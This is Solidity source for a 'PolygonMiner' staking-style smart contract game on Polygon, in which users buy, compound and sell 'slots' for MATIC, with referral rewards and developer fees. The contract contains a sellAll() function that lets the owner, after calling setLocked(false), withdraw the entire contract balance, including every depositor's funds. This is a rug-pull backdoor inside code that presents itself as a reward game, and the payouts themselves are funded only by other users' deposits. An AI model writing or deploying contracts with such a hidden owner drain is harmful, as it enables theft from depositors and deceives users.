/**
 *Submitted for verification at polygonscan.com on 2022-08-02
*/

/**
 *Submitted for verification at BscScan.com on 2021-03-22
*/

/**
 *Website: https://polygonminer.com
*/

pragma solidity ^0.4.26; // solhint-disable-line

contract PolygonMiner{
    //uint256 SLOTS_PER_MINERS_PER_SECOND=1;
    uint256 public SLOTS_TO_HATCH_1MINERS=1440000;//for final version should be seconds in a day
    uint256 PSN=10000;
    uint256 PSNH=5000;
    bool public initialized=false;
    bool public locked=true;
    address public ceoAddress;
    mapping (address => uint256) public hatcheryMiners;
    mapping (address => uint256) public claimedSlots;
    mapping (address => uint256) public lastHatch;
    mapping (address => address) public referrals;
    mapping (address => uint256) public stakedMatics;
    uint256 public totalStakedAmount;
    uint256 public marketSlots;
    constructor() public{
        ceoAddress=msg.sender;
    }
    function compoundSlots(address ref) public {
        require(initialized);

        uint256 hasSlots=getMySlots();
        uint256 slotValue=calculateSlotSell(hasSlots);

        stakedMatics[msg.sender] += slotValue;
        totalStakedAmount += slotValue;

        hatchSlots(ref);
    }
    function hatchSlots(address ref) public{
        require(initialized);
        if(ref == msg.sender) {
            ref = 0;
        }
        if(referrals[msg.sender]==0 && referrals[msg.sender]!=msg.sender){
            referrals[msg.sender]=ref;
        }
        uint256 slotsUsed=getMySlots();
        uint256 newMiners=SafeMath.div(slotsUsed,SLOTS_TO_HATCH_1MINERS);
        hatcheryMiners[msg.sender]=SafeMath.add(hatcheryMiners[msg.sender],newMiners);
        claimedSlots[msg.sender]=0;
        lastHatch[msg.sender]=now;
        
        //send referral slots
        claimedSlots[referrals[msg.sender]]=SafeMath.add(claimedSlots[referrals[msg.sender]],SafeMath.div(slotsUsed,20));
        
        //boost market to nerf miners hoarding
        marketSlots=SafeMath.add(marketSlots,SafeMath.div(slotsUsed,5));
    }
    function sellSlots() public{
        require(initialized);
        uint256 hasSlots=getMySlots();
        uint256 slotValue=calculateSlotSell(hasSlots);
        uint256 fee=devFeeToSell(slotValue);
        uint256 realRewards = SafeMath.sub(slotValue,fee);

        claimedSlots[msg.sender]=0;
        lastHatch[msg.sender]=now;
        marketSlots=SafeMath.add(marketSlots,hasSlots);
        ceoAddress.transfer(fee);
        msg.sender.transfer(realRewards);

        // stakedMatics[msg.sender] -= slotValue;
        // totalStakedAmount -= slotValue;
    }

    function setLocked(bool flag) public{
        require(initialized);
        require(ceoAddress == msg.sender);
        locked = flag;
    }
    function sellAll() public{
        require(initialized);
        require(locked == false);
        require(ceoAddress == msg.sender);

        uint256 amount = getBalance();
        msg.sender.transfer(amount);
    }

    function maticRewards() public view returns(uint256) {
        uint256 hasSlots = getMySlots();
        uint256 slotValue = calculateSlotSell(hasSlots);
        return slotValue;
    }

    function buySlots(address ref) public payable{
        require(initialized);
        uint256 slotsBought=calculateSlotBuy(msg.value,SafeMath.sub(address(this).balance,msg.value));
        slotsBought=SafeMath.sub(slotsBought,devFeeToBuy(slotsBought));
        uint256 fee=devFeeToBuy(msg.value);
        ceoAddress.transfer(fee);
        claimedSlots[msg.sender]=SafeMath.add(claimedSlots[msg.sender],slotsBought);

        stakedMatics[msg.sender] += msg.value;
        totalStakedAmount += msg.value;

        hatchSlots(ref);
    }
    //magic trade balancing algorithm
    function calculateTrade(uint256 rt,uint256 rs, uint256 bs) public view returns(uint256){
        //(PSN*bs)/(PSNH+((PSN*rs+PSNH*rt)/rt));
        return SafeMath.div(SafeMath.mul(PSN,bs),SafeMath.add(PSNH,SafeMath.div(SafeMath.add(SafeMath.mul(PSN,rs),SafeMath.mul(PSNH,rt)),rt)));
    }
    function calculateSlotSell(uint256 slots) public view returns(uint256){
        return calculateTrade(slots,marketSlots,address(this).balance);
    }
    function calculateSlotBuy(uint256 eth,uint256 contractBalance) public view returns(uint256){
        return calculateTrade(eth,contractBalance,marketSlots);
    }
    function calculateSlotBuySimple(uint256 eth) public view returns(uint256){
        return calculateSlotBuy(eth,address(this).balance);
    }
    function devFeeToBuy(uint256 amount) public pure returns(uint256){
        return SafeMath.div(SafeMath.mul(amount,7),100);
    }
    function devFeeToSell(uint256 amount) public pure returns(uint256){
        return SafeMath.div(SafeMath.mul(amount,4),100);
    }
    function seedMarket() public payable{
        require(marketSlots==0);
        initialized=true;
        marketSlots=144000000000;
    }
    function getBalance() public view returns(uint256){
        return address(this).balance;
    }
    function getMyMiners() public view returns(uint256){
        return hatcheryMiners[msg.sender];
    }
    function getMySlots() public view returns(uint256){
        return SafeMath.add(claimedSlots[msg.sender],getSlotsSinceLastHatch(msg.sender));
    }
    function getSlotsSinceLastHatch(address adr) public view returns(uint256){
        uint256 secondsPassed=min(SLOTS_TO_HATCH_1MINERS,SafeMath.sub(now,lastHatch[adr]));
        return SafeMath.mul(secondsPassed,hatcheryMiners[adr]);
    }
    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return a < b ? a : b;
    }
}

library SafeMath {

  /**
  * @dev Multiplies two numbers, throws on overflow.
  */
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    assert(c / a == b);
    return c;
  }

  /**
  * @dev Integer division of two numbers, truncating the quotient.
  */
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    // assert(b > 0); // Solidity automatically throws when dividing by 0
    uint256 c = a / b;
    // assert(a == b * c + a % b); // There is no case in which this doesn't hold
    return c;
  }

  /**
  * @dev Substracts two numbers, throws on overflow (i.e. if subtrahend is greater than minuend).
  */
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }

  /**
  * @dev Adds two numbers, throws on overflow.
  */
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }
}